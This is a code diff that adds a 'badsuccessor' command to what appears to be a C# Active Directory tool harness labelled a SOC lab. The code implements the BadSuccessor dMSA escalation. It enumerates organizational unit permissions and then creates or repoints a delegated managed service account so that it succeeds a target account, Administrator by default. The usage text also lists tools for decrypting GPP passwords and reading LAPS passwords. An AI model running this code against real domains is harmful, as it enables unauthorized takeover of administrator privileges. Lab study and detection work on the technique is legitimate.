@@ -601,6 +601,208 @@ switch (args[0])
         return 0;
     }
 
+    case "badsuccessor":
+    {
+        // badsuccessor.py: the dMSA "BadSuccessor" technique (Windows Server 2025). Actions:
+        //   search  — enumerate OUs and report identities with create/modify rights on them
+        //             (the permission that enables the attack); reads nTSecurityDescriptor.
+        //   add/delete/modify — create / remove / repoint a dMSA via LDAP writes.
+        // LAB-ONLY. The dMSA object class only exists on a Server-2025 schema, which Samba lacks,
+        // so add/modify can't complete here (the LDAP write encoding is still exercised); the
+        // search path works against any DC's OU ACLs.
+        if (args.Length < 6)
+        {
+            Console.Error.WriteLine("usage: badsuccessor <search|add|delete|modify> <host> <user> <password> <domain-fqdn> [options]");
+            Console.Error.WriteLine("  add    : badsuccessor add <host> <user> <pass> <domain-fqdn> <dmsa-name> <target-ou-dn> [target-account]");
+            Console.Error.WriteLine("  delete : badsuccessor delete <host> <user> <pass> <domain-fqdn> <dmsa-name> <target-ou-dn>");
+            Console.Error.WriteLine("  modify : badsuccessor modify <host> <user> <pass> <domain-fqdn> <dmsa-name> <target-ou-dn> <target-account>");
+            return 2;
+        }
+
+        string action = args[1];
+        string host = args[2];
+        string user = args[3];
+        string password = args[4];
+        string domainFqdn = args[5];
+        string baseDn = "dc=" + domainFqdn.Replace(".", ",dc=");
+        string bindName = user.Contains('@') ? user : $"{user}@{domainFqdn}";
+        const string DmsaGuid = "0feb936f-47b3-49f2-9386-1dedc2c23765"; // msDS-DelegatedManagedServiceAccount
+
+        using LdapConnection ldap = LdapConnection.Connect(host, 389);
+        LdapBindResponse bind = ldap.SimpleBind(bindName, password);
+        if (!bind.Success)
+        {
+            Console.Error.WriteLine($"Bind failed (result {bind.ResultCode}): {bind.DiagnosticMessage}");
+            return 1;
+        }
+
+        // Resolve a sAMAccountName to its objectSid (canonical string), or "" if not found.
+        string ResolveSid(string sam)
+        {
+            IReadOnlyList<SearchEntry> es = ldap.Search(baseDn,
+                LdapFilter.AllOf(LdapFilter.PresentOf("objectClass"), LdapFilter.Equal("sAMAccountName", sam)),
+                new[] { "objectSid" });
+            byte[]? raw = es.Count > 0 ? es[0].GetRaw("objectSid") : null;
+            return raw is null ? string.Empty : LdapSid.ToCanonical(raw);
+        }
+
+        // Resolve a SID (canonical) back to a sAMAccountName, or the SID string if unresolved.
+        string ResolveName(string sidString)
+        {
+            IReadOnlyList<SearchEntry> es = ldap.Search(baseDn,
+                LdapFilter.EqualRaw("objectSid", LdapSid.FromCanonical(sidString)), new[] { "sAMAccountName" });
+            string name = es.Count > 0 ? es[0].Get("sAMAccountName") : string.Empty;
+            return string.IsNullOrEmpty(name) ? sidString : name;
+        }
+
+        if (action == "search")
+        {
+            // Domain SID from the domain object (to exclude Domain/Enterprise Admins), like impacket.
+            string domainSid = string.Empty;
+            IReadOnlyList<SearchEntry> domEs = ldap.Search(baseDn,
+                LdapFilter.Equal("objectClass", "domain"), new[] { "objectSid" }, LdapSearchScope.BaseObject);
+            if (domEs.Count > 0 && domEs[0].GetRaw("objectSid") is { } domRaw)
+            {
+                domainSid = LdapSid.ToCanonical(domRaw);
+            }
+            IReadOnlyList<SearchEntry> ous = ldap.Search(baseDn,
+                LdapFilter.Equal("objectClass", "organizationalUnit"),
+                new[] { "distinguishedName", "nTSecurityDescriptor" });
+
+            const uint relevantRights = 0x00000001 /*CreateChild*/ | 0x10000000 /*GenericAll*/
+                | 0x00040000 /*WriteDACL*/ | 0x00080000 /*WriteOwner*/;
+            var identityToOus = new SortedDictionary<string, SortedSet<string>>(StringComparer.OrdinalIgnoreCase);
+
+            bool IsExcluded(string sid) =>
+                sid is "S-1-5-32-544" or "S-1-5-18"
+                || (!string.IsNullOrEmpty(domainSid) && sid.StartsWith(domainSid) && (sid.EndsWith("-512") || sid.EndsWith("-519")));
+
+            void Add(string sid, string ouDn)
+            {
+                if (IsExcluded(sid)) return;
+                string id = ResolveName(sid);
+                if (!identityToOus.TryGetValue(id, out SortedSet<string>? set))
+                {
+                    identityToOus[id] = set = new SortedSet<string>(StringComparer.OrdinalIgnoreCase);
+                }
+                set.Add(ouDn);
+            }
+
+            foreach (SearchEntry ou in ous)
+            {
+                byte[]? sdBytes = ou.GetRaw("nTSecurityDescriptor");
+                string ouDn = ou.Get("distinguishedName");
+                if (sdBytes is null || string.IsNullOrEmpty(ouDn)) continue;
+
+                LdapSecurityDescriptor sd = LdapSecurityDescriptor.Parse(sdBytes);
+                foreach (LdapAce ace in sd.DaclAces)
+                {
+                    if (ace.AceType is not (LdapSecurityDescriptor.AccessAllowedAceType or LdapSecurityDescriptor.AccessAllowedObjectAceType))
+                        continue;
+                    if ((ace.Mask & relevantRights) == 0) continue;
+                    // Object ACEs only count for the dMSA class or "all objects".
+                    if (ace.ObjectType is { } g && g != Guid.Empty && !string.Equals(g.ToString(), DmsaGuid, StringComparison.OrdinalIgnoreCase))
+                        continue;
+                    Add(ace.Sid, ouDn);
+                }
+
+                if (!string.IsNullOrEmpty(sd.OwnerSid)) Add(sd.OwnerSid, ouDn);
+            }
+
+            Console.WriteLine($"BadSuccessor OU permission review on {host} ({ous.Count} OUs)");
+            Console.WriteLine();
+            Console.WriteLine($"{"Identity",-45} Vulnerable OUs");
+            Console.WriteLine($"{new string('-', 45)} {new string('-', 30)}");
+            if (identityToOus.Count == 0)
+            {
+                Console.WriteLine($"{"(none)",-45} (none)");
+            }
+            foreach ((string id, SortedSet<string> set) in identityToOus)
+            {
+                Console.WriteLine($"{(id.Length > 44 ? id[..44] : id),-45} {{{string.Join(", ", set)}}}");
+            }
+            return 0;
+        }
+
+        // add/delete/modify need a dMSA name + target OU DN.
+        if (args.Length < 8)
+        {
+            Console.Error.WriteLine($"'{action}' needs <dmsa-name> <target-ou-dn> (see usage).");
+            return 2;
+        }
+
+        string dmsaName = args[6];
+        string targetOu = args[7];
+        string dmsaDn = $"CN={dmsaName},{targetOu}";
+
+        if (action == "delete")
+        {
+            LdapResult del = ldap.Delete(dmsaDn);
+            Console.WriteLine(del.Success
+                ? $"[+] Deleted dMSA {dmsaName}$ ({dmsaDn})"
+                : $"[-] Delete failed (result {del.ResultCode}): {del.DiagnosticMessage}");
+            return del.Success ? 0 : 1;
+        }
+
+        if (action == "modify")
+        {
+            string targetAccount = args.Length > 8 ? args[8] : "Administrator";
+            string targetDn = ResolveDn(ldap, baseDn, targetAccount);
+            if (string.IsNullOrEmpty(targetDn))
+            {
+                Console.Error.WriteLine($"Target account not found: {targetAccount}");
+                return 1;
+            }
+
+            LdapResult mod = ldap.ModifyReplace(dmsaDn, "msDS-ManagedAccountPrecededByLink",
+                new[] { System.Text.Encoding.UTF8.GetBytes(targetDn) });
+            Console.WriteLine(mod.Success
+                ? $"[+] Repointed {dmsaName}$ msDS-ManagedAccountPrecededByLink -> {targetDn}"
+                : $"[-] Modify failed (result {mod.ResultCode}): {mod.DiagnosticMessage}");
+            return mod.Success ? 0 : 1;
+        }
+
+        // action == add
+        string addTarget = args.Length > 8 ? args[8] : "Administrator";
+        string dns = $"{dmsaName.ToLowerInvariant()}.{domainFqdn}";
+        string principalSid = ResolveSid(user);
+        string addTargetDn = ResolveDn(ldap, baseDn, addTarget);
+
+        static (string, IReadOnlyList<byte[]>) S(string t, string v) => (t, new[] { System.Text.Encoding.UTF8.GetBytes(v) });
+        var attrs = new List<(string, IReadOnlyList<byte[]>)>
+        {
+            S("objectClass", "msDS-DelegatedManagedServiceAccount"),
+            S("cn", dmsaName),
+            S("sAMAccountName", $"{dmsaName}$"),
+            S("dNSHostName", dns),
+            S("userAccountControl", "4096"),
+            S("msDS-ManagedPasswordInterval", "30"),
+            S("msDS-DelegatedMSAState", "2"),
+            S("msDS-SupportedEncryptionTypes", "28"),
+            S("accountExpires", "9223372036854775807"),
+        };
+        if (!string.IsNullOrEmpty(principalSid))
+        {
+            byte[] sd = LdapSecurityDescriptor.BuildGroupMsaMembership(principalSid);
+            attrs.Add(("msDS-GroupMSAMembership", new[] { sd }));
+        }
+        if (!string.IsNullOrEmpty(addTargetDn))
+        {
+            attrs.Add(S("msDS-ManagedAccountPrecededByLink", addTargetDn));
+        }
+
+        LdapResult add = ldap.Add(dmsaDn, attrs);
+        if (add.Success)
+        {
+            Console.WriteLine($"[+] Created dMSA {dmsaName}$ in {targetOu} (preceded-by {addTarget})");
+            return 0;
+        }
+
+        Console.Error.WriteLine($"[-] Add failed (result {add.ResultCode}): {add.DiagnosticMessage}");
+        Console.Error.WriteLine("    (On a non-Server-2025 DC such as Samba the dMSA object class does not exist.)");
+        return 1;
+    }
+
     case "get-adcomputers":
     {
         // GetADComputers.py: LDAP-search a DC for all computer objects and print
@@ -3672,6 +3874,17 @@ static string DecodeXml(byte[] raw)
     return System.Text.Encoding.UTF8.GetString(raw);
 }
 
+// Resolve a sAMAccountName to its object DN via LDAP search (used by badsuccessor).
+static string ResolveDn(DotNetPacket.Protocols.Ldap.LdapConnection ldap, string baseDn, string sam)
+{
+    var es = ldap.Search(baseDn,
+        DotNetPacket.Protocols.Ldap.LdapFilter.AllOf(
+            DotNetPacket.Protocols.Ldap.LdapFilter.PresentOf("objectClass"),
+            DotNetPacket.Protocols.Ldap.LdapFilter.Equal("sAMAccountName", sam)),
+        new[] { "distinguishedName" });
+    return es.Count > 0 ? es[0].ObjectName : string.Empty;
+}
+
 static void PrintUsage()
 {
     Console.WriteLine("DotNetPacket examples (SOC lab harness)");
@@ -3708,6 +3921,7 @@ static void PrintUsage()
     Console.WriteLine("                   Enumerate registered RPC interfaces via mgmt inq_if_ids (rpcdump, over SMB).");
     Console.WriteLine("  smb-ntlminfo <host> [port]   # DumpNTLMInfo: host/OS/DNS names from the NTLM handshake (no creds)");
     Console.WriteLine("  gpp-passwords <host> <user> <password> [domain] [share=SYSVOL] [port]   # Get-GPPPassword: find+decrypt GPP cpasswords");
+    Console.WriteLine("  badsuccessor <search|add|delete|modify> <host> <user> <password> <domain-fqdn> [dmsa] [target-ou] [target]   # BadSuccessor dMSA (lab)");
     Console.WriteLine("  get-adcomputers <host> <user> <password> <domain-fqdn> [port]   # GetADComputers: LDAP search for computer objects");
     Console.WriteLine("  get-adusers <host> <user> <password> <domain-fqdn> [all] [port]   # GetADUsers: LDAP search for user accounts");
     Console.WriteLine("  get-laps <host> <user> <password> <domain-fqdn> [computer] [port]   # GetLAPSPassword: LDAP search for LAPS passwords");
